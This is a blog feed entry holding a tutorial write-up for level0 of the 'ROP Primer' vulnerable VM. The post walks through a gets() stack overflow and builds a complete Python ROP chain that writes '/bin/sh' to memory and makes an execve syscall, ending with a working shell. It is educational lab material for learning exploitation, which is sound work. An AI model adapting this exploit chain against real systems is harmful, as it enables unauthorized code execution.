@@ -1,0 +1,497 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Level0 | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/level0/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2015-06-28T19:53:34+02:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[ROP Primer - Level0]]></title>
+    <link href="http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/"/>
+    <updated>2015-06-28T19:45:38+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/06/28/rop-primer-level0</id>
+    <content type="html"><![CDATA[<p>The ROP VM which I made for this exercise can be downloaded from <a href="https://www.vulnhub.com/entry/rop-primer-02,114/">vulnhub.com</a>. Version 0.2 is fixed, as the home dirs had improper permissions (thanks to faleur and marky for notifying me). We&rsquo;re up against the binary <code>level0</code>. In this case, we have the source code, which helps tremendously. Nevertheless, start by treating it as a blackbox.</p>
+
+<!--more-->
+
+
+<p>First, enable coredumps.</p>
+
+<pre><code class="bash">seb@minol:~/tmp$ ulimit -c unlimited
+</code></pre>
+
+<p>Then, make sure you&rsquo;re not running the exploits against a SUID binary. Linux, by default, will <em>not</em> generate coredumps for SUID binaries. Fair enough. Thanks to @Swappage for alerting me during the workshop!</p>
+
+<pre><code class="bash">seb@minol:~/tmp$ # remember, coredumps don't work on suid binaries
+seb@minol:~/tmp$ # so cp ./level0 (suid level1) to ./level0b
+</code></pre>
+
+<p>Finally, disassemble the binary with <code>objdump</code>:</p>
+
+<pre><code class="bash">seb@minol:~/tmp$ objdump -d -M intel ./level0 &gt; level0.out
+seb@minol:~/tmp$ # -M intel will use the Intel syntax instead of AT&amp;T's syntax.
+</code></pre>
+
+<p>In some cases, the binary is the only thing given, with no source code available. The disassembly will help to get an understanding of what the binary is doing.</p>
+
+<p>Another useful command is <code>file</code>:</p>
+
+<pre><code class="bash">seb@minol:~/tmp$ file ./level0
+./level0: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=0x52c391fb68f9d0b47e49220dfe408334f8fdd088, not stripped
+</code></pre>
+
+<p>This tells us that the binary is 32 bit and statically linked, which explains its large size.</p>
+
+<p>Let&rsquo;s have a look at the disassembly of <code>main()</code>:</p>
+
+<pre><code>08048254 &lt;main&gt;:
+ 8048254:       55                      push   ebp
+ 8048255:       89 e5                   mov    ebp,esp
+ 8048257:       83 e4 f0                and    esp,0xfffffff0
+ 804825a:       83 ec 30                sub    esp,0x30
+ 804825d:       c7 04 24 68 b6 0a 08    mov    DWORD PTR [esp],0x80ab668
+ 8048264:       e8 d7 0c 00 00          call   8048f40 &lt;_IO_puts&gt;
+ 8048269:       c7 04 24 80 b6 0a 08    mov    DWORD PTR [esp],0x80ab680
+ 8048270:       e8 0b 0b 00 00          call   8048d80 &lt;_IO_printf&gt;
+ 8048275:       8d 44 24 10             lea    eax,[esp+0x10]
+ 8048279:       89 04 24                mov    DWORD PTR [esp],eax
+ 804827c:       e8 2f 0b 00 00          call   8048db0 &lt;_IO_gets&gt;
+ 8048281:       8d 44 24 10             lea    eax,[esp+0x10]
+ 8048285:       89 44 24 04             mov    DWORD PTR [esp+0x4],eax
+ 8048289:       c7 04 24 98 b6 0a 08    mov    DWORD PTR [esp],0x80ab698
+ 8048290:       e8 eb 0a 00 00          call   8048d80 &lt;_IO_printf&gt;
+ 8048295:       b8 00 00 00 00          mov    eax,0x0
+ 804829a:       c9                      leave  
+ 804829b:       c3                      ret    
+</code></pre>
+
+<p>We have a classic buffer overflow situation here:</p>
+
+<pre><code> 8048275:       8d 44 24 10             lea    eax,[esp+0x10]
+ 8048279:       89 04 24                mov    DWORD PTR [esp],eax
+ 804827c:       e8 2f 0b 00 00          call   8048db0 &lt;_IO_gets&gt;
+</code></pre>
+
+<p>The <code>lea</code> command will load a stack address into <code>eax</code>. That address is put on the stack as an argument for <code>_IO_gets</code>, which will happily read more than enough bytes from STDIN to overflow the buffer and overwrite the saved return address on the stack.</p>
+
+<p>Let&rsquo;s switch to <code>gdb-peda</code> and see the binary in action.</p>
+
+<pre><code class="bash">seb@minol:~/tmp$ # gdb -q is quiet startup, so it won't print out lots of info. Not strictly necessary. 
+seb@minol:~/tmp$ gdb ./level0 -q
+Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+
+<p><code>checksec</code> is a very useful command available in <code>gdb-peda</code> (not in vanilla <code>gdb</code>). In this case, one can see that only NX is enabled, meaning that the stack, heap and other data sections are not executable, whereas code sections are executable but not writeable. Let&rsquo;s check this within <code>gdb</code>. First, enter <code>start</code> to run the binary and break at the <code>main()</code> function automatically. Then, inspect the memory layout with <code>vmmap</code>, which will show memory regions that are active in memory along with their memory protection flags.</p>
+
+<pre><code class="bash">gdb-peda$ start
+[----------------------------------registers-----------------------------------]
+EAX: 0xbffff6bc --&gt; 0xbffff7ff ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
+EBX: 0x0 
+ECX: 0x1 
+EDX: 0xbffff6b4 --&gt; 0xbffff7ea ("/home/seb/tmp/level0")
+ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
+EDI: 0x193a5dce 
+EBP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0 
+ESP: 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0 
+EIP: 0x8048257 (&lt;main+3&gt;:   and    esp,0xfffffff0)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804824f &lt;frame_dummy+63&gt;:  jmp    0x80481a0 &lt;register_tm_clones&gt;
+   0x8048254 &lt;main&gt;:    push   ebp
+   0x8048255 &lt;main+1&gt;:  mov    ebp,esp
+=&gt; 0x8048257 &lt;main+3&gt;:  and    esp,0xfffffff0
+   0x804825a &lt;main+6&gt;:  sub    esp,0x30
+   0x804825d &lt;main+9&gt;:  mov    DWORD PTR [esp],0x80ab668
+   0x8048264 &lt;main+16&gt;: call   0x8048f40 &lt;puts&gt;
+   0x8048269 &lt;main+21&gt;: mov    DWORD PTR [esp],0x80ab680
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff618 --&gt; 0xbffff688 --&gt; 0x0 
+0004| 0xbffff61c --&gt; 0x8048445 (&lt;__libc_start_main+421&gt;:    mov    DWORD PTR [esp],eax)
+0008| 0xbffff620 --&gt; 0x1 
+0012| 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea ("/home/seb/tmp/level0")
+0016| 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
+0020| 0xbffff62c --&gt; 0x0 
+0024| 0xbffff630 --&gt; 0x0 
+0028| 0xbffff634 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Temporary breakpoint 1, 0x08048257 in main ()
+gdb-peda$ vmmap
+Start      End        Perm  Name
+0x08048000 0x080ca000 r-xp  /home/seb/tmp/level0
+0x080ca000 0x080cb000 rw-p  /home/seb/tmp/level0
+0x080cb000 0x080ef000 rw-p  [heap]
+0xb7fff000 0xb8000000 r-xp  [vdso]
+0xbffdf000 0xc0000000 rw-p  [stack]
+</code></pre>
+
+<p>The output of <code>vmmap</code> clearly shows NX in effect: the stack is marked writeable but not executable; the binary, loaded at 0x8048000, is marked executable but not writeable.</p>
+
+<p>So far, so good. Let&rsquo;s continue to run the binary with <code>c</code> and try to overwrite the saved return address on the stack, taking advantage of the <code>_IO_gets</code> call. Note: you can use a patterned buffer for this as well, check out <code>pattern_create</code> and <code>pattern_offset</code> in gdb-peda.</p>
+
+<pre><code class="bash">gdb-peda$ c
+[+] ROP tutorial level0
+[+] What's your name? AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL
+[+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL!
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84 
+EDX: 0x80cb690 --&gt; 0x0 
+ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
+EDI: 0x687af80d 
+EBP: 0x4b4b4b4b ('KKKK')
+ESP: 0xbffff620 --&gt; 0x0 
+EIP: 0x4c4c4c4c ('LLLL')
+EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x4c4c4c4c
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff620 --&gt; 0x0 
+0004| 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7ea ("/home/seb/tmp/level0")
+0008| 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7ff ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
+0012| 0xbffff62c --&gt; 0x0 
+0016| 0xbffff630 --&gt; 0x0 
+0020| 0xbffff634 --&gt; 0x0 
+0024| 0xbffff638 --&gt; 0x0 
+0028| 0xbffff63c --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x4c4c4c4c in ?? ()
+</code></pre>
+
+<p>Lucky shot. <code>eip</code> loaded with <code>LLLL</code> because we&rsquo;ve overwritten the return address for <code>main()</code> on the stack. As soon as the <code>ret</code> at the end of <code>main()</code> was executed, it popped the value off of the top of the stack into <code>eip</code> and increased <code>esp</code> with four. Because we&rsquo;ve overwritten that value, we now control <code>eip</code>. To have a look at the stack, issue the following command:</p>
+
+<pre><code>gdb-peda$ x/20wx $esp-48
+0xbffff5f0: 0x41414141  0x42424242  0x43434343  0x44444444
+0xbffff600: 0x45454545  0x46464646  0x47474747  0x48484848
+0xbffff610: 0x49494949  0x4a4a4a4a  0x4b4b4b4b  0x4c4c4c4c
+0xbffff620: 0x00000000  0xbffff6b4  0xbffff6bc  0x00000000
+0xbffff630: 0x00000000  0x00000000  0x00000000  0x00000000
+</code></pre>
+
+<p><code>x</code> stands for inspect, with the format specifier and amount after the slash (in this case, 20 DWORDS). Finally, give it the address from which you want to inspect. In this case, I chose <code>$esp-48</code>, which is the start of the buffer on the stack. Confirm that this is our input.</p>
+
+<p>So let&rsquo;s use this first bit of information and write a script to reliably overwrite the saved return address on the stack. This will serve as the skeleton for our exploit.</p>
+
+<pre><code class="python">import struct
+
+# this is a helper function, which will take a 32-bit value and convert it to little-endian.
+def p(x):
+    return struct.pack('&lt;L', x)
+
+# start our payload as a string of character.
+payload = ""
+
+# add padding to overwrite upto the saved return address.
+payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"
+
+# this part should overwrite the saved return address on the stack.
+payload += p(0xdeadbeef)
+
+# make sure to output the rop chain.
+print payload
+</code></pre>
+
+<p>To verify that this will return to <code>0xdeadbeef</code> by overwriting the saved return address, we have two options:</p>
+
+<ol>
+<li>run it outside of gdb and inspect the coredump that is generated</li>
+<li>run it, store the rop chain in a file and run the binary in gdb with the file as input</li>
+</ol>
+
+
+<h2>Method 1</h2>
+
+<p>Running the exploit in this way is the most accurate way, at least as far as memory layout and stack addresses are concerned. There might be a discrepancy between memory addresses when running within <code>gdb</code> vs outside of <code>gdb</code>. There is a way to fix this, using <a href="">fixenv</a>: I did not know of this solution until BSides!
+<code>``bash
+seb@minol:~/tmp$ python poc.py | ./level0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
+Segmentation fault (core dumped)
+seb@minol:~/tmp$ gdb -q ./level0 core
+Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
+[New LWP 2922]
+Core was generated by</code>./level0&#8217;.
+Program terminated with signal 11, Segmentation fault.</p>
+
+<h1>0  0xdeadbeef in ?? ()</h1>
+
+<p>gdb-peda$
+&#8220;`</p>
+
+<h2>Method 2</h2>
+
+<p>This method is especially useful if you need to inspect the memory with <code>vmmap</code>: <code>gdb</code> cannot display memory layout of a coredump!</p>
+
+<pre><code class="bash">seb@minol:~/tmp$ python poc.py &gt; input_for_bin
+seb@minol:~/tmp$ gdb -q ./level0
+Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
+gdb-peda$ r &lt; input_for_bin 
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKﾭ�!
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84 
+EDX: 0x80cb690 --&gt; 0x0 
+ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
+EDI: 0x88c01b86 
+EBP: 0x4b4b4b4b ('KKKK')
+ESP: 0xbffff620 --&gt; 0x0 
+EIP: 0xdeadbeef
+EFLAGS: 0x210246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0xdeadbeef
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff620 --&gt; 0x0 
+0004| 0xbffff624 --&gt; 0xbffff6b4 --&gt; 0xbffff7e9 ("/home/seb/tmp/level0")
+0008| 0xbffff628 --&gt; 0xbffff6bc --&gt; 0xbffff7fe ("ORBIT_SOCKETDIR=/tmp/orbit-seb")
+0012| 0xbffff62c --&gt; 0x0 
+0016| 0xbffff630 --&gt; 0x0 
+0020| 0xbffff634 --&gt; 0x0 
+0024| 0xbffff638 --&gt; 0x0 
+0028| 0xbffff63c --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0xdeadbeef in ?? ()
+</code></pre>
+
+<p>Regardless of which method is used, <code>eip</code> now points at <code>0xdeadbeef</code>, which confirms that our proof-of-concept exploit works as intended. We can now start extending the ROP chain to start doing useful things.</p>
+
+<p>In the workshop, I showed the mprotect/read/ret to shellcode strategy. In this writeup, I will use a different way to spawn a shell. We will need access to <code>execve</code> or <code>system()</code> for this.</p>
+
+<p>A lot of students of the ROP workshop tried to find <code>system()</code>, fruitlessly:</p>
+
+<pre><code class="bash">gdb-peda$ p system
+No symbol table is loaded.  Use the "file" command.
+</code></pre>
+
+<p><code>system()</code> is not linked in this binary! There is, however, one <code>int 0x80; ret</code> gadget available, which we can use to build a ROP chain. During the workshop in London I showed the <code>mprotect</code> and <code>read</code> strategy. Now, I&rsquo;d like to show how to do an <code>execve</code> syscall using the ROP chain. For added fun, I&rsquo;ll assume that NULL bytes are badchars.</p>
+
+<p>First, however, upload the binary to <a href="http://ropshell.com">ropshell.com</a> or use Your-Favorite-ROP-Gadget-Dumper.</p>
+
+<p>One thing that is <em>absolutely</em> mandatory is access to a gadget that does a syscall. ropshell.com suggests <code>&gt; 0x08052cf0 : int 0x80; ret</code>. Sometimes, there might be another gadget where extra instructions are present between the <code>int</code> and the <code>ret</code>. This is usually fine and you can find them in ropshell.com by searching like this: <code>int 0x80 ?</code>. The extra <code>?</code> indicates that extra opcodes may be present.</p>
+
+<p>Now that we have that all important gadget, we can start building the rest of the ROP chain. We&rsquo;ll need to set a couple of registers and build the argument for <code>execve</code> in memory.</p>
+
+<p>For x86 syscalls, the arguments are passed in registers. <a href="http://syscalls.kernelgrok.com/">This website</a> contains a list of the syscalls and a short description of the arguments. For <code>execve</code>, we see this:</p>
+
+<pre><code>eax = syscall number = 0x0b
+ebx = pointer to filename to execute
+ecx = pointer to argv
+edx = pointer to envp
+</code></pre>
+
+<p>However, I was unable to get the exploit to work when <code>ecx</code> was pointing to a string. Instead, I opted to set <code>ecx</code> and <code>edx</code> to NULL. Let&rsquo;s start building this ROP chain, starting from the PoC. We will need to write out the string <code>/bin/sh</code> somewhere in memory. For this, we need two things:</p>
+
+<ol>
+<li>A location to write the string</li>
+<li>A gadget that allows us to write out the string</li>
+</ol>
+
+
+<p>For #1, we can look at the output of vmmap in gdb-peda:</p>
+
+<pre><code>gdb-peda$ vmmap
+Start      End        Perm  Name
+0x08048000 0x080ca000 r-xp  /home/seb/tmp/level0
+0x080ca000 0x080cb000 rw-p  /home/seb/tmp/level0
+0x080cb000 0x080ef000 rw-p  [heap]
+0xb7fff000 0xb8000000 r-xp  [vdso]
+0xbffdf000 0xc0000000 rw-p  [stack]
+</code></pre>
+
+<p>ASLR is disabled, but taking the heap or stack is not my favorite option. Instead, let&rsquo;s use <code>0x080ca000</code> to <code>0x080cb000</code>. This area is readable and writeable. Not executable but that doesn&rsquo;t matter, as we will not store shellcode there anyway.</p>
+
+<p>For #2, ropshell.com has no good suggestions, as they are <code>add [r32], r32</code> instructions. If the memory contains values already, we&rsquo;ll not be able to write out the string reliably, unless the block of memory contains NULL bytes.</p>
+
+<p>To avoid complications, I searched for <code>mov [?</code> in ropshell.com:</p>
+
+<pre><code>ropshell&gt; search mov [?
+found many, display max 256 gadgets
+&gt; 0x0806bc2b : mov [ecx], 0x83; ret
+&gt; 0x08071e79 : mov [ecx], 1; ret
+&gt; 0x08079191 : mov [edx], eax; ret
+&gt; 0x080a82e8 : mov [eax + 0x4c], edx; ret
+&gt; 0x080a6544 : mov [ecx + 0x1fc0], 4; ret
+&gt; 0x08076839 : mov [ecx + 0x83049a74], cl; ret
+&gt; 0x08052fac : mov [ecx], 1; pop ebp; ret 4
+&gt; 0x080499d2 : mov [ecx], eax; pop ebp; ret
+&gt; 0x080526f6 : mov [ecx], edx; pop ebp; ret
+</code></pre>
+
+<p>I like <code>0x08079191 : mov [edx], eax; ret</code> a lot. It&rsquo;s only uses two registers and contains no unnecessary instructions. Let&rsquo;s see how we can set <code>edx</code> and <code>eax</code> to what we need.</p>
+
+<pre><code>ropshell&gt; search pop r32
+found 15 gadgets
+&gt; 0x0806b893 : pop eax; ret
+&gt; 0x080525ee : pop ebx; ret
+&gt; 0x080525c6 : pop edx; ret
+&gt; 0x0806a5c9 : pop esi; ret
+&gt; 0x080516ad : pop edi; ret
+&gt; 0x08048550 : pop ebp; ret
+&gt; 0x08064630 : pop esp; ret
+&gt; 0x080525ed : pop ecx; pop ebx; ret
+</code></pre>
+
+<p>Plenty of gadgets we can use. The plan is now to pop the address <code>0x080ca040</code> into <code>edx</code> and the value <code>/bin</code> into <code>eax</code>. The address is arbitrary, but chosen such that we don&rsquo;t overwrite anything important or that the address contains NULL bytes. Let&rsquo;s build the first PoC:</p>
+
+<pre><code class="python">import struct
+
+# this is a helper function, which will take a 32-bit value and convert it to little-endian.
+def p(x):
+    return struct.pack('&lt;L', x)
+
+# start our payload as a string of character.
+payload = ""
+
+# add padding to overwrite upto the saved return address.
+payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK"
+
+payload += p(0x080525c6)    # pop edx; ret
+payload += p(0x080ca040)    # start writing here
+payload += p(0x0806b893)    # pop eax; ret
+payload += '/bin'           # first part of /bin/sh
+payload += p(0x08079191)    # mov [edx], eax; ret
+
+payload += p(0x080525c6)    # pop edx; ret
+payload += p(0x080ca044)    # just after the first piece of '/bin'
+payload += p(0x0806b893)    # pop eax; ret
+payload += '/shX'           # we'll zero out the X in a moment
+payload += p(0x08079191)    # mov [edx], eax; ret
+
+payload += p(0x08097bff)    # xor eax, eax; ret (set eax to 0)
+payload += p(0x080525c6)    # pop edx; ret
+payload += p(0x080ca047)    # zero out the X, making the string NULL terminated
+payload += p(0x08079191)    # mov [edx], eax; ret
+
+payload += "AAAA"           # crash
+print payload
+</code></pre>
+
+<p>Run it and expect the memory area:</p>
+
+<pre><code>seb@minol:~/tmp$ python purepoc0.py &gt; input0
+seb@minol:~/tmp$ gdb -q level0
+Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
+gdb-peda$ r &lt; input0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK�@�
+              ��/bin��D�
+                       ��/shX��{       �G�
+                                         �AAAA!
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xbffff5cc --&gt; 0x80ca720 --&gt; 0xfbad2a84 
+EDX: 0x80ca047 --&gt; 0x0 
+ESI: 0x80488e0 (&lt;__libc_csu_fini&gt;:  push   ebp)
+EDI: 0x6f23fbda 
+EBP: 0x4b4b4b4b ('KKKK')
+ESP: 0xbffff658 --&gt; 0x0 
+EIP: 0x41414141 ('AAAA')
+EFLAGS: 0x210246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41414141
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff658 --&gt; 0x0 
+0004| 0xbffff65c --&gt; 0x0 
+0008| 0xbffff660 --&gt; 0x0 
+0012| 0xbffff664 --&gt; 0x0 
+0016| 0xbffff668 --&gt; 0x0 
+0020| 0xbffff66c --&gt; 0x6f23fbda 
+0024| 0xbffff670 --&gt; 0x0 
+0028| 0xbffff674 --&gt; 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41414141 in ?? ()
+gdb-peda$ x/s 0x80ca040
+0x80ca040:   "/bin/sh"
+</code></pre>
+
+<p>Excellent, that worked. Now we have to set the registers accordingly. <code>ebx</code> must be set to <code>0x80ca040</code>, <code>eax</code> must be set to <code>0x0b</code> and we&rsquo;ll zero out <code>ecx</code> and <code>edx</code>.</p>
+
+<p>There are no gadgets that do <code>xor ecx, ecx; ret</code>. Instead, I opted to load <code>0xffffffff</code> into <code>ecx</code> and <code>edx</code> and then increase the registers by one; this will overflow and make both of them zero.</p>
+
+<pre><code># building from the previous code
+
+payload += p(0x080525ed)    # pop ecx; pop ebx; ret
+payload += p(0xffffffff)    # ecx -&gt; will be zeroed later
+payload += p(0x080ca040)    # ebx, filename to execute "/bin/sh"
+payload += p(0x08083f36)    # inc ecx; adc al, 0x39; ret
+                            # this will clobber eax, but we'll set it later anyway. ecx will be zero
+
+# do the same for edx                       
+payload += p(0x080525c6)    # pop edx; ret
+payload += p(0xffffffff)    # 
+payload += p(0x0804ef21)    # inc edx; add al, 0x83; ret
+</code></pre>
+
+<p>Our next problem arises: I don&rsquo;t want to use NULL bytes. However, we&rsquo;ll need to set <code>eax</code> to <code>0x0000000b</code>. I use the following sequence for this, making use of the <code>movzx</code> instruction. <code>movzx</code> is <em>move into register, zero extend</em>.</p>
+
+<pre><code># continue
+
+payload += p(0x0806b893)    # pop eax; ret
+payload += p(0x4141410b)    # value for eax, without NULL bytes
+payload += p(0x08071b90)    # movzx eax, al; ret
+                            # after this instruction, eax will be 0x0b
+
+payload += p(0x08052cf0)    # int 0x80; ret
+</code></pre>
+
+<p>That&rsquo;s it. Let&rsquo;s try:</p>
+
+<pre><code class="bash">seb@minol:~/tmp$ python purepoc0.py &gt; input0
+seb@minol:~/tmp$ gdb -q level0
+Reading symbols from /home/seb/tmp/level0...(no debugging symbols found)...done.
+gdb-peda$ r &lt; input0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...
+
+process 3481 is executing new program: /bin/dash
+[Inferior 1 (process 3481) exited normally]
+Warning: not running or target is remote
+gdb-peda$
+</code></pre>
+
+<p>Nice! It looks like the shell was spawned! A final test consists of running it on the command line. The extra <code>cat</code> is added to keep the spawned shell alive, by connecting stdin and stdout of the newly created shell.</p>
+
+<pre><code class="bash">seb@minol:~/tmp$ (python purepoc0.py; cat) | ./level0
+[+] ROP tutorial level0
+[+] What's your name? [+] Bet you can't ROP me, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK...&lt;snipped&gt;
+id
+uid=1000(seb) gid=1000(seb) groups=1000(seb),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),103(fuse),104(scanner),107(bluetooth),108(netdev),119(kismet),900(cbnetwork)
+whoami
+seb
+</code></pre>
+
+<p>That was about it. The ROP chain is able to set all the required registers, write out a string in memory and finally perform a syscall.</p>
+]]></content>
+  </entry>
+  
+</feed>
